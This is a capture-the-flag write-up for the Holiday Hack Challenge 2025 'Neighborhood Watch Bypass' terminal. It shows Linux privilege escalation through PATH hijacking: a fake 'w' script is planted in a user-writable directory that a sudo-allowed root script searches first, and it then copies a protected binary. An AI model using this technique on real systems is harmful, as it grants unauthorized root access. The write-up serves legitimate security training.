# Neighborhood Watch Bypass

## Objective

Difficulty: ❄️  
[Hints](./docs/HHC_2025/neighborhood/hints/hint-neighborhood-watch-bypass.md)

Assist Kyle at the old data center with a fire alarm that just won't chill.

## Solution / Flag

Solve in terminal

## Detailed Solution

```bash 
🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨
              DOSIS NEIGHBORHOOD FIRE ALARM SYSTEM - LOCKOUT MODE
🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨

🚨 EMERGENCY ALERT: Fire alarm system admin access has been compromised! 🚨
The fire safety systems are experiencing interference and 
admin privileges have been mysteriously revoked. The neighborhood's fire 
protection infrastructure is at risk!

⚠️ CURRENT STATUS: Limited to standard user access only
🔒 FIRE SAFETY SYSTEMS: Partially operational but restricted
🎯 MISSION CRITICAL: Restore full fire alarm system control

Your mission: Find a way to bypass the current restrictions and elevate to 
fire safety admin privileges. Once you regain full access, run the special 
command `/etc/firealarm/restore_fire_alarm` to restore complete fire alarm system control and 
protect the Dosis neighborhood from potential emergencies.

🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨
```

checking what we have permission to run shows a script

```bash
🏠 chiuser @ Dosis Neighborhood ~ 🔍 $ sudo -l
Matching Defaults entries for chiuser on 6e06a5e10b09:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty,
    secure_path=/home/chiuser/bin\:/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+="API_ENDPOINT API_PORT RESOURCE_ID HHCUSERNAME", env_keep+=PATH

User chiuser may run the following commands on 6e06a5e10b09:
    (root) NOPASSWD: /usr/local/bin/system_status.sh
```

Reading the contents of the file shows that several commands are called without an absolute path

```bash
 chiuser @ Dosis Neighborhood ~ 🔍 $ cat /usr/local/bin/system_status.sh 
#!/bin/bash
echo "=== Dosis Neighborhood Fire Alarm System Status ==="
echo "Fire alarm system monitoring active..."
echo ""
echo "System resources (for alarm monitoring):" 
free -h
echo -e "\nDisk usage (alarm logs and recordings):"
df -h
echo -e "\nActive fire department connections:"
w
echo -e "\nFire alarm monitoring processes:"
ps aux | grep -E "(alarm|fire|monitor|safety)" | head -5 || echo "No active fire monitoring processes detected"
echo ""
echo "🔥 Fire Safety Status: All systems operational"
echo "🚨 Emergency Response: Ready"
echo "📍 Coverage Area: Dosis Neighborhood (all sectors)"
```

Running w confirms that it works

```bash
🏠 chiuser @ Dosis Neighborhood ~ 🔍 $ w
 11:13:45 up 3 days, 11:40,  0 users,  load average: 0.07, 0.02, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
```

checking which gives location

```bash
🏠 chiuser @ Dosis Neighborhood ~ 🔍 $ which w
/usr/bin/w
```

checking the contents of $PATH shows that /home/chiuser/bin is the first path so we'll work there

```bash
🏠 chiuser @ Dosis Neighborhood ~ 🔍 $ echo $PATH
/home/chiuser/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

Test creating a file as root.  Notice the file is not created until the script is run as root

```bash
 chiuser @ Dosis Neighborhood ~/bin 🔍 $ echo -ne '#!/bin/bash\ntouch text.txt'> w
🏠 chiuser @ Dosis Neighborhood ~/bin 🔍 $ chmod 777 w
🏠 chiuser @ Dosis Neighborhood ~/bin 🔍 $ ls -la
total 16
drwxr-xr-x 1 chiuser chiuser 4096 Nov 18 12:59 .
drwxr-x--- 1 chiuser chiuser 4096 Oct  8 14:08 ..
lrwxrwxrwx 1 root    root      33 Oct  8 14:08 runtoanswer -> /etc/firealarm/restore_fire_alarm
-rwxrwxrwx 1 chiuser chiuser   26 Nov 18 12:59 w
🏠 chiuser @ Dosis 
```

Run the file as root then verify that the test file was indeed created as root

```bash
 chiuser @ Dosis Neighborhood ~/bin 🔍 $ sudo /usr/local/bin/system_status.sh 
=== Dosis Neighborhood Fire Alarm System Status ===
Fire alarm system monitoring active...

System resources (for alarm monitoring):
               total        used        free      shared  buff/cache   available
Mem:            31Gi       2.5Gi        23Gi       1.0Mi       5.3Gi        28Gi
Swap:             0B          0B          0B

Disk usage (alarm logs and recordings):
Filesystem      Size  Used Avail Use% Mounted on
overlay         296G   16G  268G   6% /
tmpfs            64M     0   64M   0% /dev
shm              64M     0   64M   0% /dev/shm
/dev/sda1       296G   16G  268G   6% /etc/hosts
tmpfs            16G     0   16G   0% /proc/acpi
tmpfs            16G     0   16G   0% /sys/firmware

Active fire department connections:

Fire alarm monitoring processes:
root          25  0.0  0.0   3472  1588 pts/1    S+   12:59   0:00 grep -E (alarm|fire|monitor|safety)

🔥 Fire Safety Status: All systems operational
🚨 Emergency Response: Ready
📍 Coverage Area: Dosis Neighborhood (all sectors)
🏠 chiuser @ Dosis Neighborhood ~/bin 🔍 $ 
🏠 chiuser @ Dosis Neighborhood ~/bin 🔍 $ 
🏠 chiuser @ Dosis Neighborhood ~/bin 🔍 $ ls -la
total 16
drwxr-xr-x 1 chiuser chiuser 4096 Nov 18 12:59 .
drwxr-x--- 1 chiuser chiuser 4096 Oct  8 14:08 ..
lrwxrwxrwx 1 root    root      33 Oct  8 14:08 runtoanswer -> /etc/firealarm/restore_fire_alarm
-rw-r--r-- 1 root    root       0 Nov 18 12:59 text.txt
-rwxrwxrwx 1 chiuser chiuser   26 Nov 18 12:59 w
```

Modify the payload to copy the file that we need to run into our local directory

```bash
 chiuser @ Dosis Neighborhood ~/bin 🔍 $ echo -ne '#!/bin/bash\ncp /etc/firealarm/restore_fire_alarm /home/chiuser/bin'> w
🏠 chiuser @ Dosis Neighborhood ~/bin 🔍 $ sudo /usr/local/bin/system_status.sh 
=== Dosis Neighborhood Fire Alarm System Status ===
Fire alarm system monitoring active...

System resources (for alarm monitoring):
               total        used        free      shared  buff/cache   available
Mem:            31Gi       2.5Gi        23Gi       1.0Mi       5.3Gi        28Gi
Swap:             0B          0B          0B

Disk usage (alarm logs and recordings):
Filesystem      Size  Used Avail Use% Mounted on
overlay         296G   16G  268G   6% /
tmpfs            64M     0   64M   0% /dev
shm              64M     0   64M   0% /dev/shm
/dev/sda1       296G   16G  268G   6% /etc/hosts
tmpfs            16G     0   16G   0% /proc/acpi
tmpfs            16G     0   16G   0% /sys/firmware

Active fire department connections:

Fire alarm monitoring processes:
root          46  0.0  0.0   3472  1636 pts/1    S+   13:02   0:00 grep -E (alarm|fire|monitor|safety)

🔥 Fire Safety Status: All systems operational
🚨 Emergency Response: Ready
📍 Coverage Area: Dosis Neighborhood (all sectors)
🏠 chiuser @ Dosis Neighborhood ~/bin 🔍 $ 
🏠 chiuser @ Dosis Neighborhood ~/bin 🔍 $ ls -la
total 6040
drwxr-xr-x 1 chiuser chiuser    4096 Nov 18 13:02 .
drwxr-x--- 1 chiuser chiuser    4096 Oct  8 14:08 ..
-rwxr-xr-x 1 root    root    6167688 Nov 18 13:02 restore_fire_alarm
lrwxrwxrwx 1 root    root         33 Oct  8 14:08 runtoanswer -> /etc/firealarm/restore_fire_alarm
-rw-r--r-- 1 root    root          0 Nov 18 12:59 text.txt
-rwxrwxrwx 1 chiuser chiuser      66 Nov 18 13:02 w
```

Run the file to complete the challenge

```bash
🏠 chiuser @ Dosis Neighborhood ~/bin 🔍 $ ./restore_fire_alarm 
🔥🚨 FIRE ALARM SYSTEM: Attempting to restore admin privileges...
🔒 BYPASSING SECURITY RESTRICTIONS...
📡 Connecting to fire safety control center: https://2025.holidayhackchallenge.com:443/turnstile?rid=866cc0aa-0803-44bb-acc6-a179f385bdb7
🎯 SUCCESS! Fire alarm system admin access RESTORED!
🚨 DOSIS NEIGHBORHOOD FIRE PROTECTION: FULLY OPERATIONAL
✅ All fire safety systems are now under proper administrative control
🔥 Emergency response capabilities: ACTIVE
🏠 Neighborhood fire protection: SECURED

======================================================================
   CONGRATULATIONS! You've successfully restored fire alarm system
   administrative control and protected the Dosis neighborhood!
======================================================================

🔥🚨 FIRE ALARM SYSTEM RESTORATION COMPLETE 🚨🔥
```

## References

* [(Privilege Escalation) Linux Path hijacking](https://vk9-sec.com/privilege-escalation-linux-path-hijacking/)

## Game Location

 ![alt](./docs/HHC_2025/neighborhood/Data_Center/Neighborhood_Watch_Bypass.png)
 
